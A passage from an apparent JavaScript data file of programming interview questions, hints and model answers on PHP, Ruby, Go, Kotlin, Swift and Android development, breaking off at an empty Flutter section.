      { q:'What are PHP traits and when do you use them?', hint:'Traits: code reuse without multiple inheritance. Multiple traits per class. Conflict resolution with insteadof. Abstract trait methods. Use for: logging, timestamps, soft deletes.', answer:`Traits are reusable chunks of code that can be inserted into multiple classes, solving PHP's single inheritance limitation. A class can use multiple traits - use Timestampable, SoftDeletable, Auditable - and each trait's methods are mixed into the class as if they were defined there. Abstract methods in traits force implementing classes to define them, providing a contract. When multiple traits define the same method, the insteadof operator resolves the conflict. I use traits for cross-cutting concerns: adding created_at/updated_at logic (Timestampable), soft deletion (SoftDeletable), or event dispatching (HasEvents). Overusing traits can make code hard to follow, so I prefer them for genuinely reusable behaviour rather than arbitrary code sharing.` },
      { q:'How do you prevent SQL injection and XSS in PHP?', hint:'SQL injection: PDO prepared statements with bound parameters. XSS: htmlspecialchars() for output, Content-Security-Policy headers. CSRF: synchronised token pattern. Validate all user input.', answer:`SQL injection is prevented with PDO prepared statements: $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]). The database treats the parameter as data, never as SQL syntax. XSS (Cross-Site Scripting) is prevented by escaping output: htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') converts <, >, ", and ' to HTML entities before rendering. Content-Security-Policy headers add an additional layer preventing inline script execution. CSRF is mitigated with synchronised token patterns - a unique token in forms verified server-side. I validate and sanitise all input at the boundary using filter_var() and never trust $_GET, $_POST, or $_COOKIE directly.` },
      { q:'What is Composer and how does PHP dependency management work?', hint:'Composer: PHP package manager. composer.json defines dependencies. composer.lock pins versions. autoload PSR-4 class mapping. Packagist is the default repository. vendor/ directory.', answer:`Composer is PHP's dependency manager, similar to npm for Node.js or pip for Python. composer.json defines the project's dependencies with version constraints (^, ~, >=). Running composer install creates vendor/ with all packages and composer.lock with exact resolved versions - committing the lock file ensures every developer and CI server uses identical package versions. PSR-4 autoloading in composer.json maps namespace prefixes to directories, eliminating require statements. Packagist is the main package repository. In production, composer install --no-dev --optimize-autoloader excludes development tools and generates a classmap for faster autoloading. I use private repositories (GitLab, Satis) for internal packages.` },
      { q:'What is the difference between PHP sessions and cookies? How do you secure them?', hint:'Session: server-side storage, PHPSESSID cookie holds ID. Cookie: client-side storage. Secure sessions: HttpOnly, Secure, SameSite flags. session_regenerate_id() after login. HTTPS required.', answer:`Sessions store data server-side (files or database) and send only a session ID to the client via a cookie. Cookies store data client-side and are sent with every request. Sessions are more secure for sensitive data since the data never leaves the server, but they consume server resources and require session storage management. To secure sessions: use session_regenerate_id(true) after login to prevent session fixation attacks, set session.cookie_httponly=1 (prevents JavaScript access), session.cookie_secure=1 (HTTPS only), and session.cookie_samesite=Strict (prevents CSRF). For cookies storing preferences, always set HttpOnly, Secure, and SameSite attributes and avoid storing sensitive data.` },
      { q:'What are PHP 8 features you use and how do they improve code quality?', hint:'Named arguments. Constructor property promotion. Match expression (strict, no fallthrough). Nullsafe operator (?.   ). Union types. Fibers (8.1). Enums (8.1). Readonly properties (8.1).', answer:`PHP 8 brought significant quality-of-life improvements. Named arguments make function calls self-documenting and allow skipping optional parameters. Constructor property promotion eliminates boilerplate: public function __construct(private string $name, private int $age) {} replaces three separate lines. The match expression is a strict switch replacement with no fallthrough and exhaustiveness checking. The nullsafe operator (?.) chains method calls on potentially null objects without nested null checks. Enums (8.1) replace class constants with type-safe, enumerable values. Readonly properties (8.1) enforce immutability after construction. Fibers (8.1) enable coroutine-style cooperative multitasking used by async frameworks like ReactPHP and Revolt.` },
      { q:'How do you structure a large PHP application for maintainability?', hint:'MVC or hexagonal architecture. Composer autoloading with PSR-4. Separate domain logic from framework code. Dependency injection container. Repository pattern for data access. PHPUnit for testing.', answer:`A large PHP application benefits from strict separation of concerns. I follow an MVC or hexagonal architecture: controllers handle HTTP concerns only, domain services contain business logic with no framework dependencies, and repositories abstract data access. Composer PSR-4 autoloading organises code by namespace. I use a DI container (Symfony DI, Laravel Container) to wire dependencies rather than instantiating classes directly, which makes the codebase testable. Domain logic classes have zero framework dependencies so they can be unit tested with PHPUnit without a web server. Integration tests use an in-memory SQLite database or database transactions that roll back after each test. Static analysis with PHPStan or Psalm at maximum level catches type errors before runtime.` },
    ],
    ruby: [
      { q:'What makes Ruby unique as a language? Explain blocks, procs, and lambdas.', hint:'Everything is an object. Blocks: anonymous code passed to method (yield). Proc: reusable block object. Lambda: proc with strict argument checking + own return scope. Symbols vs strings.', answer:`Ruby is a purely object-oriented language where everything - including integers, nil, and classes themselves - is an object. Blocks are anonymous chunks of code passed to a method and invoked with yield. Procs wrap blocks as objects that can be stored and called later, but they return from the enclosing method when return is called inside them. Lambdas are Procs with two differences: they enforce argument count (Proc silently ignores extra args) and return only from the lambda itself. Ruby's metaprogramming capabilities (method_missing, define_method, open classes) enable expressive DSLs like RSpec and ActiveRecord. The philosophy of conventions over configuration reduces boilerplate.` },
      { q:'How does Ruby on Rails follow convention over configuration? What are its core components?', hint:'MVC. ActiveRecord ORM (convention: plural table names, id primary key). RESTful routing (resources :posts). Generators. Asset pipeline. Convention eliminates configuration.', answer:`Rails bets on conventions to eliminate decisions: a Post model maps to the posts table, has an id primary key, and timestamps automatically. Routes generated by resources :posts create seven RESTful endpoints. Controllers named PostsController automatically render views in app/views/posts/. These conventions mean a new developer can navigate any Rails app without a README. The core components: ActiveRecord (ORM with powerful query API and migrations), ActionController (HTTP request handling), ActionView (templating with ERB), ActiveJob (background jobs), ActionMailer (email), ActionCable (WebSockets), and ActiveStorage (file uploads). Rails CLI generators scaffold models, controllers, and migrations, keeping the focus on business logic.` },
      { q:'How does ActiveRecord work? How do you optimise queries and avoid N+1?', hint:'ActiveRecord: ORM, maps classes to tables. N+1: includes() for eager loading. select() for specific columns. find_each for batches. Counter caches. bullet gem for N+1 detection.', answer:`ActiveRecord follows the Active Record pattern - model instances are both the domain object and the database row. Queries are chainable: User.where(active: true).order(:name).limit(10) builds SQL lazily, executing only when iterated. The N+1 problem occurs when accessing associations in a loop triggers individual queries per record. includes(:orders) eager-loads associations in one or two queries instead of N. For large datasets, find_each(batch_size: 500) loads records in batches rather than loading all into memory. I use select(:id, :name) to avoid fetching unnecessary columns. The bullet gem detects N+1 queries and unused eager loading in development and test environments. explain() shows the query execution plan for slow queries.` },
      { q:'What is Ruby metaprogramming? Give practical examples.', hint:'define_method, method_missing + respond_to_missing?, class_eval, attr_accessor internals, DSLs. Used by ActiveRecord (attribute accessors), RSpec (describe/it), Rails routing.', answer:`Metaprogramming lets Ruby programs modify themselves at runtime. method_missing intercepts calls to undefined methods - I use it with respond_to_missing? to create dynamic proxy objects. define_method dynamically defines methods inside loops or based on configuration. class_eval reopens a class and adds methods programmatically. attr_accessor is itself a metaprogramming macro that defines getter and setter methods. In practice, I use metaprogramming to create DSLs (like Rails migrations: add_column :users, :name, :string), build dynamic delegators, and implement the Decorator pattern without inheritance. The risk is making code hard to understand and debug - I use metaprogramming only when the benefit of the API clarity exceeds the traceability cost.` },
      { q:'How do you test Ruby and Rails applications?', hint:'RSpec: describe/context/it, let, before. Capybara: browser simulation for feature tests. FactoryBot for test data. VCR for HTTP mocking. DatabaseCleaner. Rails system tests.', answer:`Ruby testing is dominated by RSpec, which provides a BDD-style DSL: describe groups tests, context adds sub-context for conditions, and it defines individual examples. let and let! define lazy and eager helper variables; before blocks set up state. FactoryBot creates realistic test data with factory definitions that build or create objects with sensible defaults. For HTTP requests to external services, VCR records and replays responses so tests are deterministic and fast. Capybara with Selenium drives a real browser for full integration tests. I follow the test pyramid: many fast model specs, fewer request specs for API endpoints, and a small number of system specs for critical user flows. DatabaseCleaner strategies (truncation, transaction) ensure test isolation.` },
      { q:'How does Ruby handle concurrency? What are the limitations of the GIL?', hint:'GIL (MRI): only one thread runs Ruby code at a time. Threads still useful for I/O. Ractors (Ruby 3): true parallelism. JRuby: no GIL. Sidekiq: multi-threaded via GIL-friendly I/O.', answer:`MRI Ruby (the reference implementation) has a Global Interpreter Lock (GIL/GVL) that prevents true parallel execution of Ruby code across multiple threads - only one thread runs at a time. This limits CPU-bound parallelism but threads still provide concurrency for I/O-bound work because the GIL is released during I/O operations. This is why Sidekiq (multi-threaded background job processor) is efficient - jobs waiting on database queries or HTTP requests yield the GIL to other threads. For true parallelism, Ruby 3 introduced Ractors which have separate memory and no shared GIL, enabling parallel execution. JRuby runs on the JVM without a GIL. For CPU-bound parallelism in MRI, I use multiple processes (Unicorn, forking workers) rather than threads.` },
      { q:'What are Ruby gems and how do you manage dependencies with Bundler?', hint:'Gem: packaged Ruby library. Bundler: manages gem versions across the project. Gemfile defines dependencies. Gemfile.lock pins exact versions. bundle exec runs commands in the bundle context.', answer:`Gems are Ruby's packaging format for libraries. Bundler is the dependency manager: the Gemfile lists gems with version constraints (gem 'rails', '~> 7.1'), and bundle install resolves the full dependency graph and writes Gemfile.lock with exact versions. Committing Gemfile.lock ensures every developer and deployment uses identical gem versions. bundle exec prefix runs commands using the exact gem versions in the bundle, preventing version conflicts with system gems. I use gem groups (development, test, production) to exclude development tools from production installs. bundle audit checks for known security vulnerabilities in the bundle. Semantic versioning constraint operators: ~> 7.1 means >= 7.1, < 8.0 (pessimistic operator).` },
    ],
    golang: [
      { q:'What makes Go unique compared to other languages? Why choose Go?', hint:'Compiled, statically typed, garbage collected. Goroutines/channels for concurrency. No inheritance - composition + interfaces. Fast compilation. Standard library rich. Built for cloud-native services.', answer:`Go combines static typing and compilation speed close to scripting languages with C-like performance. Its concurrency model - goroutines and channels - makes writing concurrent programs straightforward compared to traditional thread-based models. Go has no inheritance, favouring composition and implicit interfaces (structural typing) which results in loosely coupled, testable code. The opinionated toolchain (gofmt, go vet, go test) eliminates style debates. Go compiles to a single statically linked binary with no runtime dependency, making deployment simple - especially for containers. I choose Go for network services, CLI tools, and infrastructure software where performance, concurrency, and operational simplicity matter more than object-oriented hierarchy.` },
      { q:'How do goroutines and channels work? What is the difference between buffered and unbuffered channels?', hint:'Goroutine: lightweight thread (~2KB stack, multiplexed on OS threads). Channel: typed conduit between goroutines. Unbuffered: synchronous rendezvous. Buffered: async up to capacity. select for multiple channels.', answer:`Goroutines are functions that run concurrently, multiplexed across OS threads by the Go runtime with very low overhead (~2KB initial stack that grows as needed). Channels provide type-safe communication between goroutines - sending blocks until a receiver is ready (unbuffered) or the buffer has space (buffered). Unbuffered channels synchronise sender and receiver like a handshake. Buffered channels (make(chan int, 100)) decouple sender and receiver up to the buffer capacity, useful for rate-limiting or batching. The select statement waits on multiple channel operations and executes the first ready case, enabling timeouts and cancellation. The mantra "do not communicate by sharing memory; share memory by communicating" captures the channel-first design philosophy.` },
      { q:'How does Go handle errors? What is the difference between error and panic?', hint:'Errors: values returned as second return value. Check explicitly. errors.Is, errors.As for wrapping. Panic: unrecoverable, like exception - recover() in defer. Custom error types with additional context.', answer:`Go treats errors as values returned as the last return value - there are no exceptions. Every error must be checked explicitly: if err != nil { return nil, fmt.Errorf("failed to open file: %w", err) }. The %w verb wraps the original error, enabling errors.Is (checks error chain for a target) and errors.As (extracts a specific error type from the chain). Custom error types implement the error interface and carry additional context. Panic is for unrecoverable programmer errors (nil pointer dereference, index out of bounds) - it unwinds the stack and terminates unless recover() is called in a deferred function. I never use panic for expected error conditions - that is what error returns are for. Libraries should never panic; applications should panic only for truly unrecoverable states.` },
      { q:'Explain Go interfaces. How does structural typing differ from Java-style explicit implementation?', hint:'Implicit: if a type has the methods, it satisfies the interface - no implements keyword. Small interfaces preferred (io.Reader: one method). Duck typing at compile time. Empty interface{}/any.', answer:`In Go, a type satisfies an interface simply by having the required methods - there is no implements keyword. This structural (duck) typing means existing types automatically satisfy new interfaces without modification, enabling retroactive interface satisfaction. This is powerful: the io.Reader and io.Writer interfaces from the standard library are satisfied by files, HTTP bodies, network connections, strings, and buffers - all without any explicit declaration. I prefer small, focused interfaces (one to three methods) - the interfaces most used in Go's standard library have one method (io.Reader, io.Writer, fmt.Stringer). Large interfaces make testing harder. The empty interface (interface{} or any in Go 1.18+) accepts any value and is used sparingly for genuinely dynamic code.` },
      { q:'How does Go handle memory management and what is the context package for?', hint:'GC: concurrent, low-pause. Escape analysis: compiler decides stack vs heap. context.Context: cancellation, deadlines, request-scoped values. Pass context as first argument to functions.', answer:`Go's concurrent garbage collector runs alongside the program with sub-millisecond pauses. The escape analysis determines at compile time whether a variable can live on the stack (fast, automatic) or must be heap-allocated (GC-managed) - variables whose address escapes the function go to the heap. The context package propagates cancellation, deadlines, and request-scoped values through a call chain. context.WithCancel returns a cancel function - calling it signals all functions in the chain receiving that context to stop work. context.WithTimeout and context.WithDeadline add time limits. I pass context as the first parameter to every function that performs I/O or calls external services, enabling graceful shutdown and request timeout enforcement.` },
      { q:'What is the Go module system and how does it work?', hint:'go.mod: module name + Go version + dependencies. go.sum: cryptographic hashes for verification. go get to add/upgrade. GOPATH replaced by modules. Vendor directory. Module proxy (proxy.golang.org).', answer:`Go modules (introduced in 1.11, standard since 1.16) are the dependency management system. go.mod defines the module path, minimum Go version, and direct dependencies with their minimum required versions. go.sum records cryptographic hashes of every dependency version to ensure reproducible, tamper-proof builds. go get package@version adds or upgrades a dependency. go mod tidy removes unused dependencies and adds missing ones. The module proxy (proxy.golang.org) caches module versions and serves them reliably - go env GOPROXY configures it. GOFLAGS=-mod=vendor forces use of a vendored copy for air-gapped builds. I commit go.mod and go.sum to version control to ensure reproducible builds across all environments.` },
      { q:'How do you write tests in Go? What is table-driven testing?', hint:'testing package: TestXxx functions. t.Error vs t.Fatal. Subtests: t.Run. Benchmarks: BenchmarkXxx. Table-driven: slice of test cases, loop, t.Run with name. testify for assertions.', answer:`Go's standard testing package uses functions named TestXxx(t *testing.T). t.Error logs a failure without stopping the test; t.Fatal stops immediately. Table-driven testing is idiomatic Go: define a slice of test cases with input and expected output, loop over them, and use t.Run(tc.name, func(t *testing.T) {...}) for named subtests that appear as separate results. This pattern scales well - adding a new case is one line. Benchmark functions (BenchmarkXxx(b *testing.B)) measure performance with b.N iterations that the framework calibrates automatically. The testify library adds richer assertions (assert.Equal, require.NoError) with better failure messages. I use go test -race to detect data races in concurrent code as part of CI.` },
    ],
    kotlin: [
      { q:'How does Kotlin null safety work? Explain nullable types and the safe call operator.', hint:'T vs T?: non-null vs nullable. Safe call (?.) returns null instead of NPE. Elvis operator (?:) default value. !! forces assertion (use sparingly). let for null-safe blocks.', answer:`Kotlin distinguishes non-null types (String) from nullable types (String?) at the type system level - the compiler enforces null safety at compile time, eliminating NullPointerExceptions. The safe call operator (?.) chains calls on nullable values, returning null if the receiver is null instead of throwing. The Elvis operator (?:) provides a default value when an expression is null: user?.name ?: "Unknown". The non-null assertion operator (!!) asserts the value is non-null and throws KotlinNullPointerException if it is - I use it only when I have proof the value cannot be null that the compiler cannot verify. The let extension function runs a block only when the receiver is non-null: optionalUser?.let { user -> sendEmail(user) }.` },
      { q:'What are Kotlin coroutines and how do they differ from threads?', hint:'Coroutines: lightweight, cooperative multitasking. launch (fire-and-forget), async/await (result). CoroutineScope. Dispatchers: Main, IO, Default. Structured concurrency prevents leaks.', answer:`Kotlin coroutines are suspendable computations that run concurrently without creating OS threads. A coroutine suspended at a network call releases its thread to do other work and resumes (possibly on a different thread) when the result arrives. launch starts a coroutine that does not return a result; async returns a Deferred<T> that you await. Dispatchers determine which thread pool coroutines run on: Dispatchers.Main for UI, Dispatchers.IO for blocking I/O operations (up to 64 threads), Dispatchers.Default for CPU-intensive work. Structured concurrency through CoroutineScope ensures coroutines are cancelled when the scope is cancelled, preventing leaks - all coroutines launched within viewModelScope are cancelled when the ViewModel is cleared.` },
      { q:'What are data classes, sealed classes, and companion objects in Kotlin?', hint:'Data class: auto equals/hashCode/toString/copy/componentN. Sealed class: exhaustive when expressions, closed hierarchy. Companion object: static-like members, factory methods.', answer:`Data classes automatically generate equals(), hashCode(), toString(), copy(), and componentN() functions based on constructor parameters - replacing dozens of lines of boilerplate in Java. copy() enables immutable updates: user.copy(name = "Alice") creates a new instance with one field changed. Sealed classes define a closed type hierarchy - all subclasses must be in the same file, enabling exhaustive when expressions where the compiler warns if a case is not handled. This replaces error-prone enum+when patterns for representing states. Companion objects provide class-level functionality (like static in Java) with Kotlin idioms: factory methods (companion object { fun create() = MyClass(...) }), constants, and extension functions on the companion.` },
      { q:'How do Kotlin extension functions work and what are their use cases?', hint:'fun String.isPalindrome(): Boolean adds a method to an existing class without inheritance. Compiled as static function with receiver. Scope functions: let, run, apply, also, with.', answer:`Extension functions allow adding methods to existing classes without modifying them or using inheritance. fun String.capitalizeWords() = split(" ").joinToString(" ") { it.capitalize() } adds a new method to String callable on any String instance. They are compiled to static functions with the receiver as the first parameter, so there is no performance cost. Scope functions (let, run, apply, also, with) are extension functions that execute a lambda on an object: apply configures an object and returns it (builder pattern), let transforms an object in a null-safe block, also performs side effects while returning the original object. I use extension functions to add domain-specific utility methods to framework classes without subclassing.` },
      { q:'How does Kotlin interoperability with Java work?', hint:'Kotlin compiles to JVM bytecode, interoperable with Java. @JvmStatic, @JvmField, @JvmOverloads annotations. Null annotations for Java callers. Kotlin can call Java; Java can call Kotlin. Mixed projects.', answer:`Kotlin compiles to standard JVM bytecode, enabling seamless bidirectional Java interoperability. Kotlin can call any Java code directly. For Java callers using Kotlin code, annotations bridge differences: @JvmStatic exposes companion object members as true static methods, @JvmField exposes properties as public fields (no getter/setter), and @JvmOverloads generates overloaded methods for Kotlin default parameters that Java does not understand natively. Kotlin properties appear as getters and setters to Java. Kotlin's nullable types are annotated with @Nullable and @NotNull (via JSR-305) so Java callers receive IDE warnings for potential nullability issues. Incremental migration - converting one file at a time to Kotlin - is safe and common.` },
      { q:'What is the Kotlin Flow API and how does it compare to LiveData?', hint:'Flow: cold stream, coroutines-based, multiplatform. StateFlow/SharedFlow: hot flows. LiveData: Android lifecycle-aware, Java-compatible. Flow preferred for non-UI layers; StateFlow replaces LiveData in ViewModel.', answer:`Kotlin Flow is a cold asynchronous stream built on coroutines - the producer code runs only when collected, and collection is coroutine-based so it respects structured concurrency and cancellation. Flow supports backpressure and a rich operator set (map, filter, flatMapLatest, combine). StateFlow is a hot state holder - it always has a value and emits to all current collectors, ideal for ViewModel state. SharedFlow is a hot broadcast channel without a mandatory current value. LiveData is Android-specific, lifecycle-aware, and Java-compatible - it was the pre-Flow solution. Modern Android development uses StateFlow in ViewModels for state and SharedFlow for one-time events, collecting in the UI layer with repeatOnLifecycle to respect the activity/fragment lifecycle.` },
      { q:'How do you handle dependency injection in a Kotlin Android project?', hint:'Hilt (recommended): @HiltAndroidApp, @AndroidEntryPoint, @Inject, @Module/@Provides. Koin: DSL-based, lightweight. Hilt generates boilerplate at compile time. Easier testing with HiltAndroidTest.', answer:`Hilt is the recommended DI framework for Android, built on Dagger. Annotate the Application class with @HiltAndroidApp to trigger code generation. Annotate activities and fragments with @AndroidEntryPoint. Inject dependencies with @Inject on constructor parameters. Define bindings in @Module classes using @Provides for third-party types or @Binds for interface-to-implementation bindings. Hilt defines component hierarchies that match Android component lifecycles - ApplicationComponent for singletons, ActivityComponent for activity-scoped instances. For testing, @HiltAndroidTest replaces bindings with test doubles. Koin is an alternative with a simpler Kotlin DSL and no code generation - I choose it for smaller projects where Hilt's compile-time overhead is disproportionate.` },
    ],
    swift: [
      { q:"How does Swift handle memory management with ARC?", hint:'ARC: Automatic Reference Counting. Strong references retain. weak: optional, zeroed when deallocated. unowned: non-optional, crashes if deallocated. Capture lists in closures prevent retain cycles.', answer:`Swift uses Automatic Reference Counting to manage memory - the compiler inserts retain/release calls, and objects are deallocated when their reference count reaches zero. Strong references (default) keep objects alive. A retain cycle occurs when two objects hold strong references to each other, preventing deallocation. weak references are optional and automatically set to nil when the referenced object deallocates - I use weak in delegate patterns and closure capture lists where the object might outlive the closure. unowned references assume the object outlives the reference and do not set to nil - appropriate when the object's lifetime is guaranteed to outlast the reference but crashes if used after deallocation. [weak self] in closure capture lists is the standard pattern for preventing retain cycles in async callbacks.` },
      { q:"What is protocol-oriented programming in Swift?", hint:'Protocols define capabilities. Protocol extensions add default implementations. Prefer protocols over class inheritance. Value types (struct) + protocol conformance. Retroactive modelling.', answer:`Swift encourages protocol-oriented programming over class inheritance. Protocols define a contract, and protocol extensions add default implementations that types get for free upon conformance. This enables composable, flexible design: a struct can conform to Identifiable, Hashable, and Codable simultaneously, combining capabilities without inheritance hierarchy. Protocol extensions allow adding functionality to existing types retroactively - extending Array where Element: Comparable adds sorting utilities to all comparable arrays. Since structs and enums (value types) can conform to protocols, POP works well with Swift's preference for value semantics. I design APIs around protocols rather than concrete types to enable testing with mock implementations.` },
      { q:"What is the difference between struct and class in Swift?", hint:'Struct: value type, copied on assignment, stack-allocated (usually). Class: reference type, shared, heap-allocated. Structs: no inheritance, no deinit. Mutating methods. Use struct by default.', answer:`Structs are value types - assignment copies the entire value. Classes are reference types - assignment copies the reference, so multiple variables can share the same object. Structs live on the stack (when not captured by closures), making them faster to allocate and deallocate. Structs cannot be subclassed and have no deinitialiser. Methods that modify struct properties must be marked mutating. Classes support inheritance, deinitializers (deinit for cleanup), and reference semantics necessary for shared mutable state. Swift's standard library types (String, Array, Dictionary) are all structs with copy-on-write optimisation - copies are cheap until mutation. I default to structs for data models and use classes for identity-based objects that need shared mutable state or lifecycle management.` },
      { q:"How do Swift optionals work and what are the patterns for unwrapping them?", hint:'Optional<T> = T or nil. Optional binding (if let, guard let). Nil coalescing (??). Optional chaining (?.). Force unwrap (!) use sparingly. Compactmap for optional arrays.', answer:`Swift optionals explicitly represent a value that may be absent - Optional<String> is either a String or nil. Optional binding with if let creates a new non-optional variable in scope: if let name = user?.name { print(name) }. guard let is the same but early-exits on nil, leaving the unwrapped value available for the rest of the function - the preferred pattern for validation. The nil coalescing operator (??) provides a default: user?.name ?? "Guest". Optional chaining (?.) propagates nil through a chain of optional accesses, returning nil if any link is nil. Force unwrapping (!) crashes if the value is nil - I use it only when I have a guarantee the compiler cannot verify, and sparingly. compactMap removes nil values from sequences of optionals.` },
      { q:"What is Swift Concurrency (async/await)? How does it improve on completion handlers?", hint:'async/await: structured concurrency, readable sequential code. Task and TaskGroup for parallel work. async let for concurrent bindings. Actor for thread-safe state. Eliminates callback hell.', answer:`Swift Concurrency (Swift 5.5+) replaces completion-handler-based async code with async/await, making asynchronous code read like synchronous code. async functions suspend without blocking a thread, and await resumes when the result is available. This eliminates callback nesting (pyramid of doom) and makes error propagation with try/catch natural. Task and TaskGroup enable structured concurrency - parent tasks wait for all child tasks, and cancellation propagates down. async let allows concurrent bindings: async let image = fetchImage(); async let metadata = fetchMetadata() runs both concurrently, then let (image, metadata) = await (image, metadata) waits for both. Actors protect mutable state from concurrent access, replacing DispatchQueue-based synchronisation with a safe, compiler-enforced mechanism.` },
      { q:"How do you architect an iOS application? Explain MVC, MVVM, and The Composable Architecture.", hint:'MVC: Apple default, Massive View Controller problem. MVVM: ViewModel has presentation logic, testable without UIKit. TCA: unidirectional state machine, reducers, effects. Choose based on team size.', answer:`Apple's MVC (Model-View-Controller) is the default iOS pattern, but controllers easily become massive, handling networking, business logic, and view management. MVVM separates presentation logic into a ViewModel that has no UIKit dependencies - it transforms model data into view-ready values and exposes Published properties. This makes the ViewModel fully unit testable without UI infrastructure. Combine or async/await handles data binding. The Composable Architecture (TCA) provides a strict unidirectional state machine: State, Action, Reducer (pure function: state + action -> new state + Effect), and Effect for async work. TCA is verbose but makes complex state predictable, testable, and debuggable. I use MVVM for most projects and TCA for large teams or features with complex state interactions.` },
      { q:"How do you handle networking in iOS using URLSession and how do you test it?", hint:'URLSession.shared for simple. URLSession with custom configuration for caching, timeouts. Codable for JSON decoding. async/await with data(from:). Test with URLProtocol stub.', answer:`URLSession is the standard iOS networking API. For simple requests, URLSession.shared.data(from: url) with async/await returns the response data. For production, I create a configured URLSession with timeouts and cache policies, and wrap it in a protocol (NetworkSession) that my service classes depend on. JSON parsing uses Codable - defining structs with the matching JSON shape and JSONDecoder handles decoding, including custom date formats and key naming strategies. For testing, URLProtocol stubbing intercepts network requests and returns mock responses without real HTTP calls - I register a custom URLProtocol subclass in the test URLSession configuration to make tests fast and deterministic. Combine's URLSession.DataTaskPublisher is an alternative for reactive codebases.` },
    ],
    android: [
      { q:'Explain the Android Activity and Fragment lifecycle. What are common lifecycle mistakes?', hint:'Activity: onCreate/onStart/onResume/onPause/onStop/onDestroy. Fragment adds onAttach/onCreateView/onDestroyView. Don\'t do heavy work in onCreate. Save state in onSaveInstanceState. Avoid memory leaks.', answer:`The Activity lifecycle: onCreate (one-time setup, inflate layout), onStart/onResume (visible/interactive), onPause/onStop (losing focus/visibility), onDestroy (cleanup). Fragments have the same plus onCreateView (inflate fragment layout) and onDestroyView (release view references to avoid leaks). Common mistakes: starting heavy work in onCreate blocking the UI thread (use coroutines or background threads), keeping references to Views past onDestroyView (causes memory leaks - set binding to null), not saving state in onSaveInstanceState for configuration changes, and performing fragment transactions after onSaveInstanceState (throws IllegalStateException). I use ViewModel to survive configuration changes without re-fetching data.` },
      { q:'What is Jetpack Compose and how does it differ from the XML View system?', hint:'Compose: declarative UI, recomposition on state change. @Composable functions. State hoisting. No View hierarchy - compiler optimised. Previews in Android Studio. Interop with XML via ComposeView.', answer:`Jetpack Compose is Android's modern declarative UI toolkit - UI is defined as @Composable functions that describe what to render, not how to update it. When state changes, affected composables recompose automatically. This contrasts with the imperative XML View system where you manually update Views in response to data changes. Compose eliminates the View hierarchy (no findViewById, no View binding boilerplate), simplifies custom drawing, and makes animations first-class. State hoisting moves state up to the caller, making composables stateless and testable. Android Studio shows live previews of composables. Compose interoperates with XML Views via ComposeView and AndroidView, enabling gradual migration. I prefer Compose for new screens and migrate legacy screens incrementally.` },
      { q:'What is the ViewModel and how does it work with LiveData and StateFlow?', hint:'ViewModel survives configuration changes (rotation). viewModelScope for coroutines. LiveData: lifecycle-aware observable. StateFlow: cold, current-value holder, replaces LiveData in modern code. Collect with repeatOnLifecycle.', answer:`ViewModel stores and manages UI-related data that survives configuration changes (screen rotation). The Android system creates the ViewModel once and reuses it - re-creation of activities/fragments does not trigger re-creation of the ViewModel. viewModelScope is a CoroutineScope tied to the ViewModel's lifecycle, automatically cancelling coroutines when the ViewModel is cleared. LiveData is a lifecycle-aware observable that only delivers values when the observer is active (STARTED/RESUMED). Modern Android replaces LiveData with StateFlow (always has a current value, collects like a Flow) and collects in the UI layer using repeatOnLifecycle(Lifecycle.State.STARTED) to automatically stop collection when the UI is not visible, resuming when it becomes visible again.` },
      { q:'How does Room database work in Android?', hint:'Room: SQLite ORM. @Entity, @Dao, @Database. Coroutine-compatible queries. Flow for reactive queries. @Transaction for multi-operation atomicity. Migration strategies. Type converters.', answer:`Room is the Android SQLite ORM layer. @Entity annotates data classes as database tables. @Dao interfaces define queries with @Query, @Insert, @Update, and @Delete annotations - Room generates the implementation at compile time. @Database defines the database class with entity list and version number. Room verifies SQL queries at compile time, catching errors before runtime. Suspend functions in DAOs enable coroutine-based async queries. @Query returning Flow<List<T>> creates a reactive query that emits a new list whenever the underlying table changes - perfect for live-updating UI. Type converters handle non-primitive types. Migrations define schema changes when incrementing the version number - I always define explicit migrations rather than using fallbackToDestructiveMigration, which deletes all data.` },
      { q:'How do you implement background work in Android?', hint:'WorkManager: deferrable, guaranteed execution (constraints, retry). Coroutines for async in foreground. Foreground Service for long-running visible work. JobScheduler (legacy). Avoid background restrictions.', answer:`Android restricts background work to preserve battery. WorkManager is the recommended solution for deferrable, guaranteed background tasks - it persists work across device reboots and retries on failure. Constraints (network available, charging, battery not low) specify when work should run. OneTimeWorkRequest and PeriodicWorkRequest handle one-off and recurring tasks. Chaining workers creates pipelines. For long-running work requiring a persistent UI notification (music playback, file upload), a Foreground Service keeps the process alive and shows a notification. Kotlin coroutines with viewModelScope handle short-lived async work tied to the UI. Firebase Cloud Messaging triggers background processing via FCM high-priority messages.` },
      { q:'How do you handle navigation in Android?', hint:'Navigation Component (Jetpack): NavGraph, NavController, SafeArgs for type-safe arguments. Back stack management. Deep links. Single Activity architecture. Compose Navigation.', answer:`The Navigation Component (Jetpack) provides a standardised navigation framework. A NavGraph defines all destinations (Fragments or Composables) and the actions connecting them. NavController performs navigation: navController.navigate(R.id.action_home_to_detail). SafeArgs generates type-safe argument classes from the navigation graph, eliminating Bundle string key errors. The back stack is managed automatically - navigate() pushes, popBackStack() pops. Deep links map external URIs to destinations. Single Activity architecture uses one Activity hosting a NavHostFragment, with Fragments (or Composables) as destinations - this simplifies shared elements, back stack management, and ViewModel scoping. For Compose, the Navigation Compose library uses String routes and route arguments.` },
      { q:'How do you optimise an Android app for performance and battery?', hint:'Profile with Android Studio Profiler. Avoid main thread work. RecyclerView with DiffUtil. Lazy loading. Baseline Profiles for startup. LeakCanary for memory leaks. Doze mode awareness.', answer:`Android performance optimisation starts with the profiler: CPU Profiler identifies slow methods and main thread violations (anything blocking the main thread for >16ms causes frame drops), Memory Profiler tracks allocations and leaks, and Network Profiler shows request patterns. RecyclerView with DiffUtil (or ListAdapter) efficiently updates lists by diffing data on a background thread and applying only changed items. Lazy loading with Paging 3 loads list data in pages. Coil or Glide handles image loading with memory and disk caching. LeakCanary detects memory leaks in debug builds. For battery: minimise wake locks, batch network requests, use WorkManager with constraints instead of polling, and respect Doze and App Standby modes. Baseline Profiles (AGP 7.3+) pre-compile critical code paths, improving startup and scroll performance.` },
    ],
    flutter: [
